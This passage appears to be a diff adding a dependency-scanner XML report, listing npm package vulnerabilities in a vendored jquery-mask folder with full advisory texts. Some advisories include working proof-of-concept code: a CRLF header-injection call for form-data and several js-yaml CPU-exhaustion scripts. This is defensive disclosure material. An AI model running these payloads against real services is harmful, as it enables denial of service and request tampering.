+        <testsuite failures="1" errors="0" time="0" id="17" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?debug" package="debug:3.2.6" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-gxpj-cx7g-858c" name="pkg:npm/debug@3.2.6">
+                <failure message="cvssV3: LOW, score: 3.700000047683716 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>Affected versions of `debug` are vulnerable to regular expression denial of service when untrusted user input is passed into the `o` formatter. 
+
+As it takes 50,000 characters to block the event loop for 2 seconds, this issue is a low severity issue.
+
+This was later re-introduced in version v3.2.0, and then repatched in versions 3.2.7 and 4.3.1.
+
+## Recommendation
+
+Version 2.x.x: Update to version 2.6.9 or later.
+Version 3.1.x: Update to version 3.1.0 or later.
+Version 3.2.x: Update to version 3.2.7 or later.
+Version 4.x.x: Update to version 4.3.1 or later.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?debug, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="18" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?debug" package="debug:4.1.1" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-gxpj-cx7g-858c" name="pkg:npm/debug@4.1.1">
+                <failure message="cvssV3: LOW, score: 3.700000047683716 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>Affected versions of `debug` are vulnerable to regular expression denial of service when untrusted user input is passed into the `o` formatter. 
+
+As it takes 50,000 characters to block the event loop for 2 seconds, this issue is a low severity issue.
+
+This was later re-introduced in version v3.2.0, and then repatched in versions 3.2.7 and 4.3.1.
+
+## Recommendation
+
+Version 2.x.x: Update to version 2.6.9 or later.
+Version 3.1.x: Update to version 3.1.0 or later.
+Version 3.2.x: Update to version 3.2.7 or later.
+Version 4.x.x: Update to version 4.3.1 or later.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?debug, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="19" name="/src/src/main/resources/static/vendors/jquery-mask/test/zepto/event.js" package="event.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="event.js"/>
+    </testsuite>
+        <testsuite failures="2" errors="0" time="0" id="20" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?extract-zip" package="extract-zip:1.6.7" skipped="0" tests="2" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-7pqw-9j4j-h8q3" name="pkg:npm/extract-zip@1.6.7">
+                <failure message="cvssV3: HIGH, score: 8.100000381469727 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H)"/>
+            <system-out>extract-zip through 2.0.1 containment-checks only the parent directory of each archive entry and never the entry&apos;s own final path component, so an archive containing two entries with identical names - a symlink whose target is outside the destination, followed by a regular file - writes through the planted symlink and yields an arbitrary file write outside the destination directory.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?extract-zip, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-jmr9-qjv8-65gv" name="pkg:npm/extract-zip@1.6.7">
+                <failure message="cvssV3: HIGH, score: 8.100000381469727 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)"/>
+            <system-out>extract-zip does not validate symlink targets when extracting zip archives. When processing a malicious zip file containing a symlink with a relative path like &apos;../../../../etc/passwd&apos;, extract-zip will extract the symlink without validation, allowing it to point outside the extraction directory. Depending on how extract-zip is used, an attacker could read or write to arbitrary files.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?extract-zip, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="21" name="/src/src/main/resources/static/vendors/fontawesome/js/fontawesome.js" package="fontawesome.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="fontawesome.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="22" name="/src/src/main/resources/static/vendors/fontawesome/js/fontawesome.min.js" package="fontawesome.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="fontawesome.min.js"/>
+    </testsuite>
+        <testsuite failures="2" errors="0" time="0" id="23" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?form-data" package="form-data:2.3.3" skipped="0" tests="2" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-fjxv-7rqg-78g4" name="pkg:npm/form-data@2.3.3">
+                <failure message="unscored severity: critical"/>
+            <system-out>### Summary
+
+form-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:
+1. can observe other values produced by Math.random in the target application, and
+2. can control one field of a request made using form-data
+
+Because the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data&apos;s boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.
+
+This is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I&apos;m not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.
+
+### Details
+
+The culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347
+
+An attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))
+
+### PoC
+
+PoC here: https://github.com/benweissmann/CVE-2025-7783-poc
+
+Instructions are in that repo. It&apos;s based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). 
+
+### Impact
+
+For an application to be vulnerable, it must:
+- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system&apos;s handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)
+- Reveal values of Math.random(). It&apos;s easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. 
+
+If an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?form-data, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-hmw2-7cc7-3qxx" name="pkg:npm/form-data@2.3.3">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)"/>
+            <system-out>## Summary
+
+`form-data` builds `multipart/form-data` request bodies. Through v4.0.5, the `field` name passed to `FormData#append` and the `filename` option are concatenated directly into the `Content-Disposition` header with no escaping of CR (`\r`), LF (`\n`), or `&quot;`. An application that uses **untrusted input as a field name or filename** therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.
+
+This is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is **conditional**: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.
+
+## Details
+
+In `lib/form_data.js`, `_multiPartHeader` builds the part header as:
+
+```javascript
+&apos;Content-Disposition&apos;: [&apos;form-data&apos;, &apos;name=&quot;&apos; + field + &apos;&quot;&apos;].concat(contentDisposition || [])
+```
+
+and `_getContentDisposition` builds `filename=&quot;&apos; + filename + &apos;&quot;&apos;`. Neither escapes control characters, so a `\r\n` in `field`/`filename` ends the header line. The same applies to `&quot;`, which can break out of the quoted parameter.
+
+### Proof of concept
+
+```javascript
+const FormData = require(&apos;form-data&apos;);
+const form = new FormData();
+form.append(&apos;email&quot;\r\nX-Injected: true\r\nfake=&quot;&apos;, &apos;user@example.com&apos;);
+console.log(form.getBuffer().toString());
+```
+
+Before the fix this emits an injected `X-Injected: true` header line. A field name that also includes `--&lt;boundary&gt;` sequences can introduce additional parts (e.g. an extra `name=&quot;is_admin&quot;` field), which a downstream parser accepts as legitimate.
+
+## Impact
+
+For an application that uses untrusted field names/filenames:
+
+- **Field injection / override (integrity).** Inject or override fields the backend trusts (e.g. `is_admin`, `role`) — the primary demonstrated impact.
+- **Header injection** into the generated multipart part.
+
+Claims of guaranteed privilege escalation, authentication bypass, high confidentiality impact, and availability impact are application-dependent downstream consequences, not properties of `form-data` itself, and are not demonstrated by the PoC.
+
+### Severity
+
+The demonstrated, library-attributable impact is integrity (field/header injection); there is no demonstrated confidentiality disclosure or availability impact in `form-data` itself, and exploitation requires the consuming app to feed untrusted data into field names/filenames. A Moderate (≈5.3, `I:L`) rating is also defensible given that precondition.
+
+## Patch
+
+Fixed in **4.0.6**, **3.0.5**, and **2.5.6**. Users on older 0.x/1.x/2.x releases should upgrade to 2.5.6 or later.
+
+The fix escapes `\r`, `\n`, and `&quot;` as `%0D`, `%0A`, and `%22` in field names and filenames, matching the WHATWG HTML `multipart/form-data` encoding algorithm that browsers implement. This neutralizes the injection while leaving ordinary field names (including `name[0]`, dotted, and unicode names) unchanged.
+
+## Workaround
+
+Until upgrading, validate or reject field names/filenames that contain control characters before calling `append`:
+
+```javascript
+if (/[\r\n]/.test(field)) { throw new Error(&apos;invalid field name&apos;); }
+```
+
+## Credit
+
+Reported by [yueyueL](https://github.com/yueyueL).</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?form-data, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="24" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?getobject" package="getobject:0.1.0" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-957j-59c2-j692" name="pkg:npm/getobject@0.1.0">
+                <failure message="cvssV3: CRITICAL, score: 9.800000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"/>
+            <system-out>Prototype pollution vulnerability in &apos;getobject&apos; version 0.1.0 allows an attacker to cause a denial of service and may lead to remote code execution.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?getobject, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="3" errors="0" time="0" id="25" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?grunt" package="grunt:1.0.4" skipped="0" tests="3" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-m5pj-vjjf-4m3h" name="pkg:npm/grunt@1.0.4">
+                <failure message="cvssV3: HIGH, score: 7.099999904632568 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H)"/>
+            <system-out>The package grunt before 1.3.0 are vulnerable to Arbitrary Code Execution due to the default usage of the function load() instead of its secure replacement safeLoad() of the package js-yaml inside grunt.file.readYAML.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?grunt, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-rm36-94g8-835r" name="pkg:npm/grunt@1.0.4">
+                <failure message="cvssV3: HIGH, score: 7.0 (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)"/>
+            <system-out>file.copy operations in GruntJS are vulnerable to a TOCTOU race condition leading to arbitrary file write in GitHub repository gruntjs/grunt prior to 1.5.3. This vulnerability is capable of arbitrary file writes which can lead to local privilege escalation to the GruntJS user if a lower-privileged user has write access to both source and destination directories as the lower-privileged user can create a symlink to the GruntJS user&apos;s .bashrc file or replace /etc/shadow file if the GruntJS user is root.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?grunt, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-j383-35pm-c5h4" name="pkg:npm/grunt@1.0.4">
+                <failure message="cvssV3: MEDIUM, score: 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)"/>
+            <system-out>Grunt prior to version 1.5.2 is vulnerable to path traversal.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?grunt, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="26" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?hosted-git-info" package="hosted-git-info:2.5.0" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-43f8-2h32-f4cj" name="pkg:npm/hosted-git-info@2.5.0">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>The npm package `hosted-git-info` before 3.0.8 are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression shortcutMatch in the fromUrl function in index.js. The affected regular expression exhibits polynomial worst-case time complexity</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?hosted-git-info, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="27" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?https-proxy-agent" package="https-proxy-agent:2.2.2" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-pc5p-h8pf-mvwp" name="pkg:npm/https-proxy-agent@2.2.2">
+                <failure message="cvssV3: MEDIUM, score: 6.099999904632568 (CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N)"/>
+            <system-out>Versions of `https-proxy-agent` prior to 2.2.3 are vulnerable to Machine-In-The-Middle. The package fails to enforce TLS on the socket if the proxy server responds the to the request with a HTTP status different than 200. This allows an attacker with access to the proxy server to intercept unencrypted communications, which may include sensitive information such as credentials.
+
+
+## Recommendation
+
+Upgrade to version 3.0.0 or 2.2.3.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?https-proxy-agent, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="28" name="/src/src/main/resources/static/vendors/jquery-mask/dist/jquery.mask.js" package="jquery.mask.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="jquery.mask.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="29" name="/src/src/main/resources/static/vendors/jquery-mask/src/jquery.mask.js" package="jquery.mask.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="jquery.mask.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="30" name="/src/src/main/resources/static/vendors/jquery-mask/dist/jquery.mask.min.js" package="jquery.mask.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="jquery.mask.min.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="31" name="/src/src/main/resources/static/vendors/jquery-mask/test/jquery.mask.test.js" package="jquery.mask.test.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="jquery.mask.test.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="32" name="/src/src/main/resources/static/vendors/jquery/jquery.min.js" package="jquery.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="jquery.min.js"/>
+    </testsuite>
+        <testsuite failures="5" errors="0" time="0" id="33" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?js-yaml" package="js-yaml:3.13.1" skipped="0" tests="5" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-2883-xcg3-v3hh" name="pkg:npm/js-yaml@3.13.1">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>## Summary
+
+`maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.
+
+## Example
+
+```yaml
+arr: &amp;arr [{}, {}, {}, ...] # N empty mappings
+targets:
+  - &lt;&lt;: *arr                # repeated K times
+```
+
+For every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.
+
+## PoC
+
+```js
+import { performance } from &apos;node:perf_hooks&apos;
+import { load, YAML11_SCHEMA } from &apos;js-yaml&apos;
+
+const n = 20000
+
+const src =
+  &apos;arr: &amp;arr [&apos; + &apos;{},&apos;.repeat(n).slice(0, -1) + &apos;]\n&apos; +
+  &apos;targets:\n&apos; +
+  &apos;  - &lt;&lt;: *arr\n&apos;.repeat(n)
+
+const started = performance.now()
+
+load(src, { schema: YAML11_SCHEMA })
+
+console.log(`${(performance.now() - started).toFixed(1)} ms`)
+```
+
+Observed results:
+
+| N | YAML size | Time |
+|---:|---:|---:|
+| 800 | ~13 KB | ~20 ms |
+| 3200 | ~50 KB | ~180 ms |
+| 20000 | ~500 KB | ~13 s |
+
+## Impact
+
+An attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.
+
+## Fix
+
+Count each merge-source mapping as one budget unit, in addition to counting its keys.
+
+## Difference with v5
+
+In v3 &amp; v4, merge is enabled by default. So, the severity score is higher.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?js-yaml, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-52cp-r559-cp3m" name="pkg:npm/js-yaml@3.13.1">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Impact
+
+js-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:
+
+```yaml
+a0: &amp;a0 { k0: 0 }
+a1: &amp;a1 { &lt;&lt;: *a0, k1: 1 }
+a2: &amp;a2 { &lt;&lt;: *a1, k2: 2 }
+a3: &amp;a3 { &lt;&lt;: *a2, k3: 3 }
+...
+b: *aN
+```
+
+For each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.
+
+### PoC
+
+From N = 4000 delay become &gt; 1s (doc size &lt; 100K)
+
+```js
+import { performance } from &apos;node:perf_hooks&apos;
+import { Buffer } from &apos;node:buffer&apos;
+import { load, YAML11_SCHEMA } from &apos;js-yaml&apos;
+
+const n = Number(process.argv[2] || 4000)
+
+function makeMergeChain (count) {
+  const lines = [&apos;a0: &amp;a0 { k0: 0 }&apos;]
+
+  for (let i = 1; i &lt; count; i++) {
+    lines.push(`a${i}: &amp;a${i} { &lt;&lt;: *a${i - 1}, k${i}: ${i} }`)
+  }
+
+  lines.push(`b: *a${count - 1}`)
+  return `${lines.join(&apos;\n&apos;)}\n`
+}
+
+const source = makeMergeChain(n)
+
+console.log(source.split(&apos;\n&apos;).slice(0, 8).join(&apos;\n&apos;))
+console.log(&apos;...&apos;)
+console.log(source.split(&apos;\n&apos;).slice(-4).join(&apos;\n&apos;))
+console.log()
+console.log(`N: ${n}`)
+console.log(`YAML size: ${Buffer.byteLength(source)} bytes`)
+
+const started = performance.now()
+const result = load(source, { schema: YAML11_SCHEMA })
+const elapsed = performance.now() - started
+
+console.log(`parse time: ${elapsed.toFixed(1)} ms`)
+console.log(`top-level keys: ${Object.keys(result).length}`)
+console.log(`b keys: ${Object.keys(result.b).length}`)
+```
+
+### Patches
+
+Fix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?js-yaml, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-5p4m-2wfm-xmqj" name="pkg:npm/js-yaml@3.13.1">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out># Quadratic CPU consumption in `!!omap` resolution (js-yaml 3.x and 4.x)
+
+## Summary
+
+`resolveYamlOmap()` enforces key uniqueness for `!!omap` sequences with a linear
+scan (`objectKeys.indexOf(...)`) inside the per-element loop, making resolution
+**O(n²)** in the number of entries. A modestly sized YAML document therefore
+consumes disproportionate CPU inside `yaml.load()`, giving a denial of service
+against any consumer that parses untrusted YAML.
+
+`!!omap` is registered in the **default schema**
+(`lib/schema/default.js` → `require(&apos;../type/omap&apos;)`), so a plain
+`yaml.load(untrustedInput)` with no options is affected — no custom schema or
+non-default configuration is required.
+
+**This is the same weakness as CVE-2026-59870 / GHSA-724g-mxrg-4qvm**, which was
+fixed in the 5.x line in 5.2.1. That fix was never backported: both currently
+maintained legacy lines still carry the original implementation.
+
+## Affected versions
+
+| Line | Latest tested | Status |
+|---|---|---|
+| 3.x | **3.15.0** | Affected — `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:29` |
+| 4.x | **4.3.0** | Affected — `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:30` |
+| 5.x | 5.2.2 | **Not affected** — fixed in 5.2.1 (uses a `Set`) |
+
+Both figures are the newest release of each line at the time of writing, so
+this is not a &quot;you are on an old version&quot; issue.
+
+## Details
+
+`lib/type/omap.js` (js-yaml 4.3.0):
+
+```js
+if (objectKeys.indexOf(pairKey) === -1) objectKeys.push(pairKey)
+else return false
+```
+
+`objectKeys` grows by one element per entry, and `Array.prototype.indexOf` is a
+linear scan, so resolving an `n`-entry `!!omap` performs roughly
+`1 + 2 + … + n` comparisons — quadratic in `n`. The work happens synchronously
+inside `yaml.load()`, blocking the event loop for its whole duration.
+
+The 5.x line already solves exactly this by tracking seen keys in a `Set`
+(`src/tag/sequence/omap.ts`):
+
+```ts
+if (carrier.seen.has(key)) return &apos;duplicate key in ordered map&apos;
+carrier.seen.add(key)
+```
+
+## Proof of concept
+
+```js
+// poc.js  —  node poc.js
+const yaml = require(&apos;js-yaml&apos;);
+const doc = n =&gt; &apos;!!omap\n&apos; + Array.from({length: n}, (_, i) =&gt; `- k${i}: ${i}`).join(&apos;\n&apos;) + &apos;\n&apos;;
+
+for (const n of [10000, 20000, 40000, 80000]) {
+  const d = doc(n), t = Date.now();
+  yaml.load(d);                      // default schema, no options
+  console.log(`n=${n} bytes=${d.length} load=${Date.now() - t}ms`);
+}
+```
+
+### Measured (node v20.20.2, default heap, no flags)
+
+**js-yaml 4.3.0**
+
+```
+n=10000  bytes=137787   load=54ms
+n=20000  bytes=297787   load=169ms
+n=40000  bytes=617787   load=646ms
+n=80000  bytes=1257787  load=2607ms
+```
+
+**js-yaml 3.15.0**
+
+```
+n=10000  bytes=137787   load=53ms
+n=20000  bytes=297787   load=166ms
+n=40000  bytes=617787   load=641ms
+n=80000  bytes=1257787  load=2567ms
+```
+
+Runtime grows by a factor of ~4 for each doubling of `n`, which is the
+signature of O(n²) (linear growth would be ~2×).
+
+Scaling further: a **2.48 MB** document with 150,000 entries blocked
+`yaml.load()` for **10.8 seconds**.
+
+## Impact
+
+Any service that parses attacker-influenced YAML with js-yaml 3.x or 4.x can be
+stalled with a small input. Because the loop is synchronous, a single request
+blocks the Node.js event loop and stalls every other request in the process —
+so the amplification is per-process, not just per-request.
+
+Suggested severity: consistent with **CVE-2026-59870** (the same weakness in
+5.x), i.e. Availability-only impact, network attack vector, no privileges or
+user interaction required.
+
+## Suggested fix
+
+Mirror the 5.x fix — replace the linear scan with a `Set`:
+
+```js
+// lib/type/omap.js
+const seen = new Set()
+// ...
+if (seen.has(pairKey)) return false
+seen.add(pairKey)
+```
+
+This preserves the existing duplicate-key rejection semantics exactly while
+making resolution O(n). A `maxOmapLength`-style cap would also work, but the
+`Set` matches what 5.x already ships and requires no new option.
+
+## References
+
+- CVE-2026-59870 / GHSA-724g-mxrg-4qvm — same weakness in 5.0.0–5.2.0, fixed in 5.2.1
+- `lib/type/omap.js` (3.x, 4.x) — the affected resolver
+- `lib/schema/default.js` — registers `!!omap` in the default schema
+
+## Discovery
+
+Found by an automated static-analysis and executed-proof-of-concept scanner run
+against js-yaml 4.2.0, then manually verified against 3.15.0 and 4.3.0 by
+executing the proof of concept above. All timings in this report were measured
+on the **current** releases of each line, not on the version originally scanned.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?js-yaml, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-h67p-54hq-rp68" name="pkg:npm/js-yaml@3.13.1">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>### Summary
+A crafted YAML document can trigger algorithmic CPU exhaustion in `js-yaml` merge-key processing (`&lt;&lt;`) by repeating the same alias many times in a merge sequence.  
+This causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.
+
+### Details
+The issue is in merge handling inside `lib/loader.js`:
+
+- `storeMappingPair(...)` iterates every element of a merge sequence when key tag is `tag:yaml.org,2002:merge`.
+- For each element, it calls `mergeMappings(...)`.
+- `mergeMappings(...)` computes `Object.keys(source)` and performs `_hasOwnProperty.call(destination, key)` checks for each key.
+
+When input is of the form:
+
+a: &amp;a {k0:0, k1:0, ..., kK:0}
+b: {&lt;&lt;: [*a, *a, *a, ... repeated M times ...]}
+all *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.
+Resulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.
+Relevant code path:
+lib/loader.js in storeMappingPair(...) merge branch (keyTag === &apos;tag:yaml.org,2002:merge&apos;)
+lib/loader.js mergeMappings(...)
+
+
+### Root cause
+File:       lib/loader.js
+Function:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,
+                             valueNode, startLine, startLineStart, startPos)
+Lines:      ~359-366
+
+    if (keyTag === &apos;tag:yaml.org,2002:merge&apos;) {
+      if (Array.isArray(valueNode)) {
+        for (index = 0, quantity = valueNode.length; index &lt; quantity; index += 1) {
+          mergeMappings(state, _result, valueNode[index], overridableKeys);
+        }
+      } else {
+        mergeMappings(state, _result, valueNode, overridableKeys);
+      }
+    }
+
+When the merge value is a sequence (YAML 1.1 &lt;&lt;: [ *a, *a, ... ]), each element
+is handed to mergeMappings() without deduplication. mergeMappings() then does
+
+    sourceKeys = Object.keys(source);
+    for (index = 0; index &lt; sourceKeys.length; index += 1) {
+      key = sourceKeys[index];
+      if (!_hasOwnProperty.call(destination, key)) {
+        setProperty(destination, key, source[key]);
+        overridableKeys[key] = true;
+      }
+    }
+
+Every alias reference in the sequence resolves (by design) to the SAME object
+via state.anchorMap. After the first merge, every subsequent merge of that same
+reference is a pure no-op semantically, but still performs:
+
+  * one Object.keys(source) call (O(K))
+  * K _hasOwnProperty.call checks on the destination
+
+Total: M * K hasOwnProperty checks + M Object.keys allocations, while the final
+object and all observable side effects are identical to a single merge.
+
+YAML semantics for `&lt;&lt;:` are idempotent and commutative over duplicate sources,
+so collapsing duplicates preserves behavior exactly; this isn&apos;t a spec trade-off.
+
+
+### PoC
+Environment:
+js-yaml version: 4.1.1
+Node.js: v24.5.0
+Platform: arm64 macOS (reproduced consistently)
+Reproduction script:
+Create many keys in one anchored map (&amp;a).
+Merge that same alias repeatedly via &lt;&lt;: [*a, *a, ...].
+Measure parse time and compare with control payload using single merge (&lt;&lt;: *a).
+Observed repeated runs (same machine):
+K=M=1000, input 9,909 bytes: ~33–36 ms
+K=M=2000, input 20,909 bytes: ~121–123 ms
+K=M=4000, input 42,909 bytes: ~524–537 ms
+K=M=6000, input 64,909 bytes: ~1,608–1,829 ms
+K=M=8000, input 86,909 bytes: ~3,395–3,565 ms
+Control (single merge, similar key counts):
+K=2000: ~1–2 ms
+K=4000: ~3 ms
